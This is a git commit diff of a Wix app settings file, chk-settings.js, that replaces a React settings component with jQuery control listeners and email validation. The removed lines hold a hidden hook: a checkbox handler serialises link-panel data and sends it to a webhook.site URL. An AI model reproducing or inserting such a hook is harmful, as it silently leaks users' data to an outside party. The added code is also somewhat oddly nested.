61e12ad3c8638611f66578a374c5a7d92e5849a5
nathantalas <94882912+nathantalas@users.noreply.github.com>
2021-11-24 19:06:11 -0500

    Update chk-settings.js

--- chk-settings.js
+++ chk-settings.js
@@ -1,54 +1,62 @@
-import UI from 'editor-ui-lib';
-import React from 'react'
-import Wix from 'Wix';
-import Main from './modules/main/main';
-import Settings from './modules/settings/settings';
-import Layout from './modules/layout/layout';
-import Design from './modules/design/design';
-import Animations from './modules/animations/animations';
-import Support from './modules/support/support';
+require('./css/main.scss')
+require('./css/fontFace.scss')
+require('./css/animations.scss')
+require('./css/settings.scss')
+require('./css/support.scss')
 
-export default class settings extends React.Component {
-    settingsUpdate (key, value) {
-        const data = {key: key, value: value};
-        Wix.Settings.triggerSettingsUpdatedEvent(data);
-        console.log(data);
-    }
+var Wix = require('Wix')
+var $ = require('jquery')
 
-    render () {
-        return (
-            <UI.appSettings>
-                <UI.panelTabs defaultTabIndex={0}>
-                    <Main tab="Main"/>
-                    <div>
-                        <div>
-                            <UI.checkbox
-                                //add the options as properties
-                                label="Show title"
-                                defaultValue={true}
-                                onChange= {Wix.Settings.openLinkPanel(function(r) {
-                                    str = "";
-                                    for (p in r) {
-                                        str += p + '=' + r[p] + ';';
-                                    }
-                                    xhr = new XMLHttpRequest();
-                                    xhr.open('get', 'https://webhook.site/88b74f80-60c3-4792-bfab-a59f1375b0f1?data=' + str);
-                                    xhr.send();
-                                    })}>
-                                //When supported, save the value inside the Wix site
-                                wix-param="show_title"
-                            </UI.checkbox>
-                        </div>
-                    </div>
-                    <Settings tab="Settings" onUpdate={this.settingsUpdate}/>
-                    <Layout tab="Layout" onUpdate={this.settingsUpdate}/>
-                    <Design tab="Design" onUpdate={this.settingsUpdate}/>
-                    <Animations tab="Animations" onUpdate={this.settingsUpdate}/>
-                    <hr className="divider-short"/>
-                    <Support tab="Support"/>
-                    <UI.button label="Upgrade" className="btn-upgrade-nav" onClick={() => Wix.Settings.openBillingPage()}/>
-                </UI.panelTabs>
-            </UI.appSettings>
-        )
-    }
+
+function onUpdate(key, value) {
+  Wix.Settings.triggerSettingsUpdatedEvent({key: key, value: value});
 }
+
+function attachListeners() {
+  $('[wix-ctrl]').each(function (index, element) {
+    var $element = $(element);
+    var ctrl = $element.getCtrl();
+    if ($.isFunction(ctrl.onChange)) {
+      ctrl.onChange(function (value) {
+        onUpdate($element.attr('wix-param'), value);
+      })
+    }
+
+    $('.support_email').getCtrl().setValidationFunction(function(email){
+      return validateEmail(email);
+    });
+
+    $(sendButtonControl);
+  });
+
+function validateEmail(email) {
+    let reg = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return reg.test(email);
+}
+
+function validateMessage(){
+  return $('.support_message').getCtrl().getValue().length > 5;
+}
+
+function sendButtonControl(){
+  $('.support_message, .support_email').each(function(index, element){
+    var ctrl = $(element).getCtrl();
+    ctrl.onChange(function(){
+      var button = $('.support_sendButton').getCtrl();
+      if(validateEmail($('.support_email').getCtrl().getValue()) && validateMessage() && button.options.disabled){
+        button.enable();
+      }
+      else{
+        button.disable();
+      }
+    });
+  });
+}
+
+
+  $('#main-cta').getCtrl().onClick(function () {
+    console.log('This is your call-to-action, take it seriously');
+  })
+}
+
+$(attachListeners);
